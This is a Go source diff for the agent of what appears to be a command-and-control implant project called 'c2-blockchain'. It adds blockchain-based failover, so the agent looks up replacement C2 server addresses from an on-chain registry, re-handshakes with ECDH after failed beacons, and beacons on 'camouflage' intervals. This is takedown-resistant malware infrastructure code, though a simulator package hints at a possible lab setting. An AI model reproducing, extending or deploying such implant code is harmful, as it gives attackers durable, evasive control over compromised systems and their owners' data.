@@ -11,35 +11,40 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"strings"
 	"time"
 
 	"github.com/joho/godotenv"
 
+	"github.com/ingeleanh/c2-blockchain/internal/agent"
 	"github.com/ingeleanh/c2-blockchain/internal/api"
 	"github.com/ingeleanh/c2-blockchain/internal/camouflage"
+	"github.com/ingeleanh/c2-blockchain/internal/chain"
 	"github.com/ingeleanh/c2-blockchain/internal/crypto"
 	"github.com/ingeleanh/c2-blockchain/internal/executor"
 	"github.com/ingeleanh/c2-blockchain/internal/sim"
 )
 
 type agentState struct {
-	serverURL   string
-	agentID     string
-	sessionID   string
-	sessionKey  []byte
-	ecdsaPriv   *ecdsa.PrivateKey
-	ecdsaPubHex string
-	sim         *sim.Simulator
-	iotGateway  bool
-	beaconCount int
+	serverURL      string
+	urlCandidates  []string
+	agentID        string
+	sessionID      string
+	sessionKey     []byte
+	ecdsaPriv      *ecdsa.PrivateKey
+	ecdsaPubHex    string
+	sim            *sim.Simulator
+	iotGateway     bool
+	beaconCount    int
+	failover       *agent.Failover
+	beaconFailures int
+	agentECDH      *ecdsa.PrivateKey
 }
 
 func main() {
 	_ = godotenv.Load()
-	serverURL := os.Getenv("C2_SERVER_URL")
-	if serverURL == "" {
-		serverURL = "http://localhost:8443"
-	}
+	serverURL := strings.TrimRight(envOr("C2_SERVER_URL", "http://localhost:8443"), "/")
+	candidates := agent.ParseURLCandidates(serverURL, os.Getenv("C2_URL_CANDIDATES"))
 	iotMode := os.Getenv("C2_IOT_GATEWAY") == "true"
 
 	priv, err := crypto.GenerateECDSAKeypair()
@@ -52,28 +57,105 @@ func main() {
 		log.Fatal(err)
 	}
 
+	cache := chain.NewCache()
+	chainReader, _ := chain.NewReader(os.Getenv("C2_RPC_URL"), os.Getenv("C2_REGISTRY_ADDRESS"), cache)
+
 	a := &agentState{
-		serverURL:   serverURL,
-		ecdsaPriv:   priv,
-		ecdsaPubHex: pubHex,
-		sim:         sim.NewSimulator(),
-		iotGateway:  iotMode,
+		serverURL:     serverURL,
+		urlCandidates: candidates,
+		ecdsaPriv:     priv,
+		ecdsaPubHex:   pubHex,
+		sim:           sim.NewSimulator(),
+		iotGateway:    iotMode,
+		agentECDH:     agentECDH,
+		failover: &agent.Failover{
+			Reader:     chainReader,
+			Candidates: candidates,
+			CurrentURL: serverURL,
+		},
 	}
 
-	if err := a.handshake(agentECDH); err != nil {
+	if err := a.connectWithFailover(); err != nil {
 		log.Fatal("handshake:", err)
 	}
-	log.Printf("agent registered: %s", a.agentID)
+
+	log.Printf("agent registered: %s (os=%s server=%s)", a.agentID, executor.CurrentOS(), a.serverURL)
 
 	for {
 		if err := a.beacon(); err != nil {
+			a.beaconFailures++
 			log.Printf("beacon error: %v", err)
+			if a.beaconFailures >= 2 {
+				a.tryFailoverReconnect()
+			}
+		} else {
+			a.beaconFailures = 0
 		}
+		a.failover.CurrentURL = a.serverURL
 		time.Sleep(camouflage.BeaconInterval(5, 10))
 	}
 }
 
-func (a *agentState) handshake(agentECDH *ecdsa.PrivateKey) error {
+func envOr(key, def string) string {
+	if v := os.Getenv(key); v != "" {
+		return v
+	}
+	return def
+}
+
+func (a *agentState) connectWithFailover() error {
+	a.alignServerFromChain()
+	firstErr := a.handshake()
+	if firstErr == nil {
+		return nil
+	}
+	log.Printf("primary handshake failed: %v — trying chain failover", firstErr)
+	if a.tryFailoverReconnect() {
+		return nil
+	}
+	return firstErr
+}
+
+func (a *agentState) alignServerFromChain() {
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+	url, cfg, err := chain.ResolveVerifiedURL(ctx, a.failover.Reader, a.urlCandidates)
+	if err != nil || url == "" {
+		return
+	}
+	if url != a.serverURL {
+		log.Printf("chain v%d: endpoint verificado on-chain → %s", cfg.Version, url)
+		a.serverURL = url
+		a.failover.CurrentURL = url
+	}
+}
+
+func (a *agentState) tryFailoverReconnect() bool {
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+	newURL, cfg, ok := a.failover.Attempt(ctx)
+	if !ok {
+		return false
+	}
+	log.Printf("failover: chain v%d verified endpoint → %s", cfg.Version, newURL)
+	a.serverURL = newURL
+	a.failover.CurrentURL = newURL
+	agentECDH, err := crypto.GenerateECDHKeypair()
+	if err != nil {
+		log.Printf("failover: ecdh: %v", err)
+		return false
+	}
+	a.agentECDH = agentECDH
+	if err := a.handshake(); err != nil {
+		log.Printf("failover handshake failed: %v", err)
+		return false
+	}
+	a.beaconFailures = 0
+	log.Printf("failover: re-registered agent %s on %s", a.agentID, a.serverURL)
+	return true
+}
+
+func (a *agentState) handshake() error {
 	resp, err := http.Post(a.serverURL+"/api/v1/agents/handshake", "application/json",
 		bytes.NewReader([]byte(`{"step":"challenge_request"}`)))
 	if err != nil {
@@ -95,7 +177,7 @@ func (a *agentState) handshake(agentECDH *ecdsa.PrivateKey) error {
 	if err != nil {
 		return err
 	}
-	pubBytes := crypto.MarshalECDHPublicKeySPKI(&agentECDH.PublicKey)
+	pubBytes := crypto.MarshalECDHPublicKeySPKI(&a.agentECDH.PublicKey)
 	reqBody := map[string]interface{}{
 		"step":            "challenge_response",
 		"nonce":           nonce,
@@ -131,11 +213,11 @@ func (a *agentState) handshake(agentECDH *ecdsa.PrivateKey) error {
 	if err != nil {
 		return err
 	}
-	serverPub, err := crypto.UnmarshalECDHPublicKeySPKI(agentECDH.Curve, serverPubBytes)
+	serverPub, err := crypto.UnmarshalECDHPublicKeySPKI(a.agentECDH.Curve, serverPubBytes)
 	if err != nil {
 		return err
 	}
-	shared, err := crypto.ECDHSharedSecret(agentECDH, serverPub)
+	shared, err := crypto.ECDHSharedSecret(a.agentECDH, serverPub)
 	if err != nil {
 		return err
 	}
